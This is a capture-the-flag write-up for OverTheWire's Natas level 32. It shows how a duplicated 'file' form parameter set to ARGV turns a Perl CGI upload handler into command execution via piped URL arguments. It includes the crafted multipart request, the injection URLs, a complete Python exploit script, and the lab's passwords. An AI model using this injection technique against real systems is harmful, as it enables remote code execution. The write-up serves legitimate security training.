# Natas Level 32 Writeup (natas32) – OverTheWire

## Overview

This level focuses on **Perl `ARGV` and command execution**.  
The goal is to find the password for the next level.

## Observation

When we open the page, we see a file upload option for a CSV file and message.  

This time you need to prove that you got code exec. There is a binary in the webroot that you need to execute. 

There is also a link to view the source code:

```text
index-source.html
```

The source code is similar to the previous level:

```perl
my $cgi = CGI->new;
if ($cgi->upload('file')) {
    my $file = $cgi->param('file');

    print '<table class="sortable table table-hover table-striped">';
    $i=0;

    while (<$file>) {
        my @elements=split /,/, $_;
        ...
    }
    print '</table>';
}
```

## Finding the Password

### Using Browser & BurpSuite

1. Upload any CSV file and intercept the request in BurpSuite.

2. Add another `file` parameter before the uploaded file:

    ```http
    Content-Disposition: form-data; name="file"

    ARGV
    ```

3. The important part of the request becomes:

    ```http
    ------geckoformboundary6a49ad92cd6c2b77459d8a0b598eef8
    Content-Disposition: form-data; name="file"

    ARGV
    ------geckoformboundary6a49ad92cd6c2b77459d8a0b598eef8
    Content-Disposition: form-data; name="file"; filename="test.csv"
    Content-Type: text/csv

    1,2
    3,4
    ```

4. Since `param('file')` returns the first value, `$file` becomes:

    ```text
    ARGV
    ```

5. Now we can pass a command through the URL. First, test:

    ```text
    /index.pl?ls%20.%20|
    ```

6. The response shows a file named:

    ```text
    getpassword
    ```

7. This is an executable file. We can run it by sending:

    ```text
    /index.pl?./getpassword%20|
    ```

8. The `getpassword` program reads the password file for **natas33** and prints it.

#### Proof

```text
<th>
    kmIpGpPfpBF529wy1C8FGb9ZSO7fTlKL
</th>
```

### Using Python

```python
import requests, re

target = 'http://natas32.natas.labs.overthewire.org'
auth = ('natas32', 'Rc3837d6qd3KoW0R2IgKssMXRX06btgY')

files = [
    ('file', (None, 'ARGV')),
    ('file', ('test.csv', '1,2\n3,4\n', 'text/csv'))
]

# payload = '/index.pl?ls%20.%20|'
payload = '/index.pl?./getpassword%20|'

r = requests.post(target + payload, auth=auth, files=files)

match = re.search(r'<th>(\w{32})', r.text)
print(f'Password for next level is: {match.group(1)}')
```

The important part is:

```python
('file', (None, 'ARGV')),
```

which makes Perl use `ARGV` as the filehandle.

## Vulnerability

The application uses the user-controlled `file` parameter as a Perl filehandle.

By setting it to `ARGV`, we can control the arguments passed to the Perl script. Adding `|` at the end makes Perl execute the argument as a command.

## Flag

`kmIpGpPfpBF529wy1C8FGb9ZSO7fTlKL`
